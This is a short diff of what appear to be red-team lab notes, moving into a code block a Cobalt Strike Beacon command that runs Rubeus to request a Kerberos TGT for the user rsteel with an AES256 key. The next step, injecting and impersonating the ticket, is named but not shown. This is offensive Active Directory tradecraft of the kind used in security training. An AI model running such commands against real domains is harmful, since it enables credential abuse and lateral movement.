@@ -44,11 +44,9 @@
 
 1.  Using their AES256 key, request a TGT for rsteel from the medium-integrity Beacon.
     
-    BeaconTypeCopy
-    
-    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap`
     
 ```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
 ```
 
 2.  From the high-integrity Beacon, inject and impersonate the ticket.
